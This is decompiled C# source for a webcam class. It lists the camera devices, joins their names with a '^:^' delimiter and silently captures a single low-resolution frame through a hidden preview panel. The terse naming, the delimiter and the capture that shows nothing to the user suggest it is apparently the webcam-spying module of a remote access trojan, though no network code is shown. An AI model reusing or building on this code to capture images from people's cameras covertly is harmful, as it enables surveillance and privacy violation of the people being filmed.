using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using DirectX.Capture;
using Microsoft.VisualBasic;

namespace n;

public class Cam
{
	public struct Active
	{
		public Filter Camera;

		public Capture CaptureInfo;

		public int Counter;

		public int CounterFrames;

		public string PathVideo;
	}

	private ComboBox Divs;

	private ComboBox Comp;

	private ListBox lboxDriver;

	private Active CaptureInformation;

	private Filters Dispositivos;

	private PictureBox p;

	public Cam()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		Divs = new ComboBox();
		Comp = new ComboBox();
		lboxDriver = new ListBox();
		Dispositivos = new Filters();
	}

	public void dispose()
	{
		CaptureInformation.CaptureInfo.DisposeCapture();
		((Component)(object)CaptureInformation.CaptureInfo).Dispose();
	}

	public Image cap(ref int i)
	{
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Expected O, but got Unknown
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		//IL_016a: Expected O, but got Unknown
		CaptureInformation.Camera = Dispositivos.VideoInputDevices[i];
		CaptureInformation.CaptureInfo = new Capture(CaptureInformation.Camera, null);
		CaptureInformation.CaptureInfo.FrameCaptureComplete += RefreshImage;
		CaptureInformation.Counter = 1;
		CaptureInformation.CounterFrames = 1;
		CaptureInformation.CaptureInfo.Stop();
		CaptureInformation.CaptureInfo.VideoCompressor = Dispositivos.VideoCompressors[0];
		string[] array = "160x120".Split(new char[1] { 'x' });
		checked
		{
			Size frameSize = new Size((int)Math.Round(Conversion.Val(array[0])), (int)Math.Round(Conversion.Val(array[1])));
			CaptureInformation.CaptureInfo.FrameSize = frameSize;
			double frameRate = Conversion.Val((object)5);
			CaptureInformation.CaptureInfo.FrameRate = frameRate;
			CaptureInformation.CaptureInfo.PreviewWindow = (Control)new Panel();
			CaptureInformation.CaptureInfo.CaptureFrame();
			int num = default(int);
			do
			{
				Thread.Sleep(1);
				Application.DoEvents();
				if (p == null)
				{
					num++;
					continue;
				}
				Image result = (Image)p.get_Image().Clone();
				((Component)(object)p).Dispose();
				return result;
			}
			while (num != 5000);
			return null;
		}
	}

	public void RefreshImage(PictureBox Frame)
	{
		p = Frame;
	}

	public string Dnames()
	{
		Divs.get_Items().Clear();
		checked
		{
			short num = (short)(Dispositivos.VideoInputDevices.Count - 1);
			for (short num2 = 0; num2 <= num; num2 = (short)unchecked(num2 + 1))
			{
				Filter filter = Dispositivos.VideoInputDevices[num2];
				Divs.get_Items().Add((object)filter.Name);
			}
			int num3 = Divs.get_Items().get_Count() - 1;
			string text = default(string);
			for (int i = 0; i <= num3; i++)
			{
				text += Divs.get_Items().get_Item(i).ToString();
				if (i != Divs.get_Items().get_Count() - 1)
				{
					text += "^:^";
				}
			}
			return text;
		}
	}
}
